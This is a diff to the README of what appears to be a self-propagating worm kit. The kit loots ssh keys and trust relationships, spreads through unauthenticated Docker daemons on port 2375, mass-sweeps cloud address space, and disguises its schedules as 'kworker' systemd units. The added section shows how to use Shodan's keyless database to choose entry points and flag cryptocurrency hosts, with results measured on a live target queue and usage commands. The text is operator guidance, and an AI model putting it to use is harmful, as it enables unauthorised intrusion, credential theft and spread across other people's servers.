@@ -26,12 +26,40 @@ Everything else is a small runnable reference implementation of it.
 | `loot.sh` | Trust-graph looter: this host's ssh config, known_hosts, own keys, history, LAN |
 | `dock.sh` | Docker spreader: exposed :2375 daemons, no credentials at all |
 | `dockmass.sh` | Docker mass sweeper: cloud /16 space, thousands of addresses per run |
+| `shodan.sh` | Keyless Shodan DB filter: `:2375` -> dock, skip hosts with no way in |
 | `kworker-spread.service` / `.timer` | LAN spread schedule |
 | `kworker-hunt.service` / `.timer` | Hunt schedule |
 | `kworker-loot.service` / `.timer` | Trust-graph loot schedule (every 6h) |
 | `kworker-dock.service` / `.timer` | Docker scan schedule (every 6h) |
 | `kworker-mass.service` / `.timer` | Docker mass sweep schedule (every 20min, budgeted) |
 | `publish.sh` | Push the kit to `CONFIG_URL` - hosts only ever see published revisions |
+
+## Search a database, don't scan
+
+A host that answers on the internet tells the whole world what it runs: open
+ports, software and version, hostnames. Shodan crawled that record and serves it
+back per IP at `internetdb.shodan.io` - with no API key - so `shodan.sh` asks the
+database before we spend anything on the host. Any candidate it has seen with
+`:2375` is handed straight to `dock.sh` (which needs no credential at all), a
+candidate it has seen with no way in is skipped before an ssh attempt is spent,
+and swap/dex/defi-named or `:8545` hosts land in `crypto.txt`.
+
+Measured on box1's live queue: of 166 candidates, 138 (83%) have nothing we could
+enter at all - so most of the old queue was unenterable, and `:2375` is rare
+enough that the database knows only a few per /16.
+
+The catch, measured on our own box: it is a *crawl*, so it is stale. A daemon we
+had exposed minutes earlier was absent from it, and "no information available" is
+common in cloud ranges. So the database filters and prioritises, and the wide
+sweep (`dockmass.sh`) stays the volume arm - the fresh server that was stood up
+yesterday on default settings is exactly the one a months-old crawl never saw.
+
+```
+sh shodan.sh filter                          # filter the queue (runs in `all`)
+sh shodan.sh scout                           # sample cloud /16s for :2375/:8545
+sh shodan.sh stat                            # what has been learned
+sh shodan.sh search 'port:2375 !cloudflare'  # real API query, needs SHODAN_KEY
+```
 
 ## 1. Host the payload
 Put on any https host you control (a cheap VPS, a GitHub release, an object
@@ -43,6 +71,7 @@ repo's `config.json`, `worker.env`, `run.sh`, `updater.sh`, `spread.sh`,
 `kworker-hunt.timer`, `kworker-loot.service`, `kworker-loot.timer`,
 `dock.sh`, `kworker-dock.service`, `kworker-dock.timer`,
 `dockmass.sh`, `kworker-mass.service`, `kworker-mass.timer`,
+`shodan.sh`,
 `bootstrap.sh`. Then set `CONFIG_URL` in `worker.env` and
 in `bootstrap.sh` to that base URL.
 
